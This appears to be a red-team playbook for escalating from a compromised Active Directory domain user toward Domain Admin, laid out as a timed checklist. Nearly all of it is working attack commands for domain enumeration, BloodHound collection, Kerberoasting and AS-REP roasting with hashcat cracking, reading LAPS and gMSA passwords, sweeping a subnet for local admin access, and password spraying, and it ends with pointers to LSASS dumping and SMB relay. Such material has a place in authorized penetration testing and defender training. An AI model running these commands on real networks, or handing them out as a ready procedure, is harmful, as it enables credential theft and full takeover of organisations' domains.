# Playbook: Domain User Obtained

## Minute 0: Confirm + Classify

```
[ ] whoami → domain\user
[ ] net user %username% /domain → AD attributes
[ ] net group "Domain Admins" /domain → Check DA list
[ ] net user /domain → All users
[ ] net group /domain → All groups
[ ] nltest /domain_trusts → Trust relationships
```

## Minute 5: BloodHound Collection

```
[ ] Upload SharpHound.ps1 → . .\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All
[ ] OR: bloodhound-python -d domain -u user -p pass -ns target -c all
[ ] Start analyzing: Find shortest path to DA
```

## Minute 15: Kerberos Attacks

```
[ ] Kerberoast:
    GetUserSPNs.py domain/user:pass -dc-ip target -request -format hashcat
    └── hashcat -m 13100 hash.txt rockyou.txt (background)

[ ] AS-REP Roast (remaining users):
    GetNPUsers.py domain/ -dc-ip target -usersfile users.txt -request -format hashcat
    └── hashcat -m 18200 hash.txt rockyou.txt (background)

[ ] Validate creds across services:
    netexec smb target -u user -p pass
    netexec winrm target -u user -p pass
    netexec mssql target -u user -p pass
```

## Minute 30: Enumerate + Escalate

```
[ ] findDelegation.py domain/user:pass -dc-ip target → Check delegation
[ ] netexec ldap target -u user -p pass -M laps → LAPS read
[ ] netexec ldap target -u user -p pass -M gmsa → gMSA passwords
[ ] netexec smb target -u user -p pass --shares → Share enumeration
[ ] netexec smb target -u user -p pass --sessions → Active sessions
[ ] netexec smb <subnet>/24 -u user -p pass --local-auth → Local admin test
[ ] SMB signing check on DC:
    nmap --script smb2-security-mode -p 445 target

[ ] Password spray with new domain user context:
    netexec smb target -u users.txt -p 'CommonPassword1!' --continue-on-success
```

## Milestone Checks
- [ ] BloodHound path to DA? → Execute path
- [ ] Kerberoast hash cracked? → Service account → Lateral
- [ ] LAPS readable? → Local admin → LSASS dump → Domain creds
- [ ] SMB relay possible? → Setup relay
- [ ] No immediate path? → Continue enumeration, check all services
